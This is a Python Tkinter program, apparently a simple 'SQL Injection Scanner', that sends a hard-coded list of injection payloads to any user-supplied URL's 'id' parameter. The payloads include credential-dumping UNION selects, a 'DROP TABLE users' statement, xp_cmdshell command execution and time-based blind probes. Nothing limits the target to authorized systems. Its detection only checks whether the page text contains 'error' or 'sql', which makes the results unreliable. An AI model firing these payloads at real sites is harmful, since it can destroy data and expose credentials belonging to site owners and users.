import requests
import tkinter as tk
from tkinter import scrolledtext, messagebox
import re

class SQLiScanner:
    def __init__(self, result_area):
        self.result_area = result_area  # Store the result_area reference
        self.payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "' UNION SELECT NULL, username, password FROM users --",
            "' UNION SELECT NULL, database() --",
            "'; DROP TABLE users; --",
            "'; SELECT * FROM information_schema.tables; --",
            "'; EXEC xp_cmdshell('net user'); --",
            "'; SELECT @@version; --",
            "'; SELECT * FROM users WHERE 'a'='a'; --",
            "'; SELECT * FROM products WHERE price < 100; --",
            "'; IF (1=1) WAITFOR DELAY '0:0:5' --",
            "'; SELECT * FROM information_schema.columns WHERE table_name='users'; --",
            "'; SELECT * FROM information_schema.tables; --",
            "'; SELECT * FROM information_schema.schemata; --",
            "'; SELECT * FROM sys.objects; --",
            "'; SELECT * FROM sys.tables; --",
            "'; SELECT * FROM sys.columns; --",
            "'; SELECT * FROM sys.databases; --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; DECLARE @sql NVARCHAR(MAX); SET @sql = 'SELECT * FROM users'; EXEC sp_executesql @sql; --"
        ]

    def is_valid_url(self, url):
        regex = re.compile(
            r'^(?:http|ftp)s?://'  # http:// or https://
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
            r'localhost|'  # localhost...
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...or ipv4
            r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # ...or ipv6
            r'(?::\d+)?'  # optional port
            r'(?:/?|[/?]\S+)$', re.IGNORECASE)
        return re.match(regex, url) is not None

    def start_scan(self, url):
        if not self.is_valid_url(url):
            messagebox.showerror("Error", "Please enter a valid URL.")
            return
        
        results = self.scan(url)
        self.display_results(results)

    def scan(self, url):
        vulnerable_payloads = []
        for payload in self.payloads:
            if self.check_vulnerability(url, payload):
                vulnerable_payloads.append(payload)
        return vulnerable_payloads

    def check_vulnerability(self, url, payload):
        test_url = f"{url}?id={payload}"  # Assuming the parameter is 'id'
        try:
            response = requests.get(test_url)
            if "error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                return True
            return False
        except requests.exceptions.RequestException:
            return False

    def display_results(self, results):
        if results:
            result_text = "Vulnerable payloads found:\n" + "\n".join(results)
        else:
            result_text = "No vulnerabilities detected."
        self.result_area.delete(1.0, tk.END)
        self.result_area.insert(tk.END, result_text)

class App:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Injection Scanner")

        self.label = tk.Label(root, text="Enter Target URL:")
        self.label.pack(pady=5)

        self.url_entry = tk.Entry(root, width=50)
        self.url_entry.pack(pady=5)

        self.scan_button = tk.Button(root, text="Scan", command=self.scan_url)
        self.scan_button.pack(pady=5)

        self.result_area = scrolledtext.ScrolledText(root, width=60, height=20)
        self.result_area.pack(pady=5)

        # Initialize the SQLiScanner with the result_area
        self.scanner = SQLiScanner(self.result_area)

    def scan_url(self):
        url = self.url_entry.get()
        self.scanner.start_scan(url)

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
